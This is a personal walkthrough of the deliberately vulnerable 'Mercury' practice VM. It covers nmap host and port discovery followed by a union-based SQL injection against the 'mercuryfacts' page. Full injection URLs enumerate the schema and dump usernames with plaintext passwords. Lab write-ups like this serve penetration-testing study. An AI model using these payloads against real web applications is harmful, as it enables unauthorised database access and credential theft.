

prepare ambiente:

1. I accessed VM

2. I used Virtual Box machine.

3. Download Mercury.ova

4. Imported Mercury.ova

5. I runned VM

Searched my IP: ip a

Made: sudo nmap -sn 192.168.0.16/24


Find VM:

Nmap scan report for 192.168.0.4
Host is up (0.0037s latency).
MAC Address: 08:00:27:72:7B:3D (Oracle VirtualBox virtual NIC)


Searched open ports:

nmap -sC -sV -p 22,8080 192.168.0.4 

Entered in this link: http://192.168.0.4:8080/

And follow the rest of tutorial in https://ra2302.github.io/posts/Mercury/

1. add /console to search some vunerability. (http://192.168.0.4:8080/console)

2. Erro page mentioned "mercuryfacts/", so...I changed to: http://192.168.0.4:8080/mercuryfacts/

3. Appears a moon with two links

http://192.168.0.4:8080/mercuryfacts/todo - things to do.

Second link (http://192.168.0.4:8080/mercuryfacts/3/)its funny, if I change the number of final in link appears different facts. 

4. I tried 'abc' in final of the final of the page and appears another error:

OperationalError at /mercuryfacts/abc/
(1054, "Unknown column 'abc' in 'where clause'")

5. Tired SQL injection:
http://192.168.0.4:8080/mercuryfacts/1 union all SELECT user()/

Appears this message: Fact id: 1 union all SELECT user(). (('Mercury does not have any moons or rings.',), ('dbmaster@localhost',))

6. Checked available databases:

http://192.168.0.4:8080/mercuryfacts/1 union all SELECT schema_name FROM information_schema.schemata

Appears this message: Fact id: 1 union all SELECT schema_name FROM information_schema.schemata. (('Mercury does not have any moons or rings.',), ('information_schema',), ('mercury',))

7. We can see that there is only one distinct database “Mercury” of interest.

http://192.168.0.4:8080/mercuryfacts/1 union all SELECT table_name FROM information_schema.tables;-- -/

<img width="1133" height="368" alt="image" src="https://github.com/user-attachments/assets/e1654546-d8c6-42ad-954e-cf728df85ef3" />


8. Let's check users table:

http://192.168.0.4:8080/mercuryfacts/1 union all SELECT column_name FROM information_schema.columns WHERE table_name %3D 'users'/

Appears the message:

Fact id: 1 union all SELECT column_name FROM information_schema.columns WHERE table_name = 'users'. (('Mercury does not have any moons or rings.',), ('id',), ('password',), ('username',))

9. Let's extract credentials from different users

http://192.168.0.4:8080/mercuryfacts/1 union all SELECT group_concat(username,"-",password) from users/

Appears this message:

Fact id: 1 union all SELECT group_concat(username,"-",password) from users. (('Mercury does not have any moons or rings.',), ('john-johnny1987,laura-lovemykids111,sam-lovemybeer111,webmaster-mercuryisthesizeof0.056Earths',))





















